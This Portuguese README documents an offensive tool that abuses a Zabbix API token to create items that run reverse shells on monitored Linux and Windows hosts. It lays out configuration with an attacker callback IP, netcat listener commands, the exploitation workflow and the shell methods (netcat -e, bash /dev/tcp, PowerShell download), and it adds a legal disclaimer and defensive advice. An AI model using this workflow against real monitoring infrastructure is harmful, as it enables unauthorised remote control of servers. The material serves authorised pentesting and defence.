# Zabbix Agent RCE Exploit v2.0

## 📋 Descrição

Esta é uma versão completamente reestruturada do exploit de execução remota de código (RCE) em agentes Zabbix. O script utiliza a API JSON-RPC do Zabbix para listar hosts disponíveis e implantar shells reversas em sistemas Windows e Linux.

### ✨ Principais Melhorias v2.0

- 🔧 **Arquitetura Modular**: Código completamente reestruturado em módulos separados
- 🚫 **Sem Servidor HTTP Automático**: Instruções manuais para configuração
- 🔍 **Detecção Automática de SO**: Sistema inteligente de detecção de sistema operacional
- 📊 **Interface Melhorada**: Interface de usuário mais limpa e intuitiva
- 🛡️ **Validação Robusta**: Validação completa de parâmetros e configurações
- 📝 **Logging Avançado**: Sistema de logs com diferentes níveis
- ⚙️ **Configuração Flexível**: Gerenciamento centralizado de configurações

## ⚠️ Aviso Legal

**Esta ferramenta foi desenvolvida APENAS para fins educacionais e de testes de segurança autorizados.** O uso desta ferramenta sem autorização explícita pode violar leis e políticas de segurança. O autor não se responsabiliza pelo uso indevido ou ilegal desta ferramenta.

## 🏗️ Estrutura do Projeto

```
zabbix-rce-2025/
├── modules/
│   ├── __init__.py              # Inicialização do pacote
│   ├── config_manager.py        # Gerenciamento de configurações
│   ├── logger_setup.py          # Configuração de logging
│   ├── zabbix_api_client.py     # Cliente da API Zabbix
│   ├── payload_generator.py     # Gerador de payloads
│   ├── os_detector.py           # Detector de sistema operacional
│   ├── exploit_manager.py       # Gerenciador de exploits
│   └── user_interface.py        # Interface de usuário
├── payloads/                    # Diretório para payloads gerados
├── zabbix_rce.py               # Script principal
├── .env                        # Configurações de ambiente
├── requirements.txt            # Dependências Python
└── README.md                   # Este arquivo
```

## 🚀 Instalação

1. **Clone o repositório:**
```bash
git clone <repository-url>
cd zabbix-rce-2025
```

2. **Instale as dependências:**
```bash
pip install -r requirements.txt
```

3. **Configure o arquivo `.env`:**
```bash
# Edite o arquivo .env com suas configurações
ZABBIX_URL=http://seu-servidor-zabbix:8080/api_jsonrpc.php
AUTH_TOKEN=seu-token-de-api-zabbix
IP_SHELL=seu-ip-publico-ou-vpn
```

## ⚙️ Configuração

### Arquivo .env

```env
# Configurações do Zabbix
ZABBIX_URL=http://192.168.25.3:8080/api_jsonrpc.php
AUTH_TOKEN=seu-token-de-api-aqui

# Configurações do servidor de callback
IP_SHELL=10.10.100.6
PORT_SERVER_PYTHON=9000

# Configurações de logging
LOG_LEVEL=INFO
LOG_FILE=zabbix_rce.log

# Configurações de timeout (em segundos)
API_TIMEOUT=10
SHELL_CHECK_DELAY=60
```

### Obtendo Token de API do Zabbix

1. Acesse a interface web do Zabbix
2. Vá em Administration > General > API tokens
3. Crie um novo token para seu usuário
4. Copie o token para o arquivo `.env`

## 📖 Uso

### Modo Interativo (Recomendado)

```bash
python zabbix_rce.py
```

### Opções de Linha de Comando

```bash
# Lista hosts disponíveis
python zabbix_rce.py --list-hosts

# Testa conexão com Zabbix
python zabbix_rce.py --test-connection

# Modo verboso (debug)
python zabbix_rce.py --verbose

# Exibe ajuda
python zabbix_rce.py --help
```

## 🔧 Configuração Manual do Servidor HTTP

⚠️ **IMPORTANTE**: Esta versão não inicia servidor HTTP automaticamente. Para exploits Windows PowerShell, você deve configurar manualmente:

### 1. Navegue até a pasta de payloads:
```bash
cd payloads
```

### 2. Inicie um servidor HTTP simples:
```bash
# Python 3
python -m http.server 8000

# Python 2
python -m SimpleHTTPServer 8000

# PHP
php -S 0.0.0.0:8000

# Node.js (se instalado)
npx http-server -p 8000
```

### 3. Prepare o listener:
```bash
# Em outro terminal
nc -lvnp 4444

# ou usando ncat
ncat -lvnp 4444
```

## 🎯 Fluxo de Exploração

1. **🔗 Conexão**: O script testa a conectividade com a API do Zabbix
2. **📋 Listagem**: Exibe todos os hosts disponíveis com detecção automática de SO
3. **🎯 Seleção**: Escolha o host alvo e interface
4. **🔍 Detecção**: Confirma ou ajusta a detecção de sistema operacional
5. **⚡ Método**: Seleciona o método de exploit apropriado
6. **⚙️ Configuração**: Define IP atacante e porta para reverse shell
7. **✅ Confirmação**: Valida todos os parâmetros antes da execução
8. **🚀 Implantação**: Cria item no Zabbix para executar o payload
9. **📞 Conexão**: Aguarda conexão reversa no listener configurado

## 🐧 Métodos para Linux

| Método | Descrição | Requisitos | Confiabilidade |
|--------|-----------|------------|----------------|
| **netcat** | Netcat tradicional com -e | netcat tradicional | Alta |
| **bash** | Redirecionamento TCP nativo | Bash com /dev/tcp | Alta |
| **python** | Socket Python | Python instalado | Média |

## 🖥️ Métodos para Windows

| Método | Descrição | Requisitos | Confiabilidade |
|--------|-----------|------------|----------------|
| **powershell** | Download via HTTP | PowerShell + HTTP | Alta |
| **direct** | Comando inline | PowerShell habilitado | Média |

## 🔍 Detecção de Sistema Operacional

O sistema de detecção analisa:

- **Nomes de hosts**: Palavras-chave e padrões específicos
- **Interfaces**: Informações de rede e portas
- **Grupos**: Classificação no Zabbix
- **Heurísticas**: Convenções de nomenclatura

### Palavras-chave para Linux:
`linux`, `ubuntu`, `debian`, `centos`, `redhat`, `fedora`, `server`, `srv`, etc.

### Palavras-chave para Windows:
`win`, `windows`, `pc`, `workstation`, `desktop`, `client`, etc.

## 🧹 Limpeza

### Automática via Script:
```bash
# Execute a opção 3 no menu principal
python zabbix_rce.py
```

### Manual via Interface Web:
1. Acesse a interface web do Zabbix
2. Navegue até Configuration > Hosts > [Host] > Items
3. Encontre e exclua os itens:
   - `linux_reverse_shell_*`
   - `windows_reverse_shell_*`
   - `nc_reverse_shell`
   - `powershell_reverse_shell`

## 📊 Logs

Os logs são salvos em `zabbix_rce.log` e incluem:

- ✅ Conexões com a API
- 🎯 Hosts e exploits selecionados
- ⚡ Métodos utilizados
- ❌ Erros e falhas
- 🧹 Operações de limpeza

## 🐛 Solução de Problemas

### Erro de Conexão com API
- Verifique URL e token no arquivo `.env`
- Confirme que o Zabbix está acessível
- Teste com `--test-connection`

### Erro de Importação de Módulos
- Verifique se todos os arquivos estão na pasta `modules/`
- Reinstale dependências: `pip install -r requirements.txt`

### Exploit Não Funciona
- Confirme que o listener está ativo: `nc -lvnp [porta]`
- Para Windows, verifique se o servidor HTTP está rodando
- Verifique logs para detalhes do erro

### Problemas de Detecção de SO
- Use seleção manual se a detecção automática falhar
- Verifique logs de detecção com `--verbose`

## 🛡️ Recomendações de Segurança

### Para Defensores:
- 🔒 Restrinja acesso à API do Zabbix
- 🔍 Monitore criação de itens suspeitos
- 🚫 Desabilite execução de comandos system.run
- 📝 Implemente logging de auditoria

### Para Pentesters:
- ✅ Obtenha autorização explícita antes do teste
- 📋 Documente todas as atividades
- 🧹 Remova itens criados após o teste
- 📊 Reporte vulnerabilidades encontradas

## 📚 Recursos Adicionais

- [Documentação da API Zabbix](https://www.zabbix.com/documentation/current/manual/api)
- [Guia de Configuração de Agentes](https://www.zabbix.com/documentation/current/manual/concepts/agent)
- [Hardening de Segurança Zabbix](https://www.zabbix.com/documentation/current/manual/appendix/security)

## 🤝 Contribuições

Contribuições são bem-vindas! Por favor:

1. Faça fork do projeto
2. Crie uma branch para sua feature
3. Commit suas mudanças
4. Abra um Pull Request

## 📄 Licença

Este projeto está licenciado sob a licença MIT - veja o arquivo LICENSE para detalhes.

---

**⚠️ Lembre-se: Use apenas para fins legítimos e autorizados! O autor não se responsabiliza pelo uso indevido desta ferramenta.**
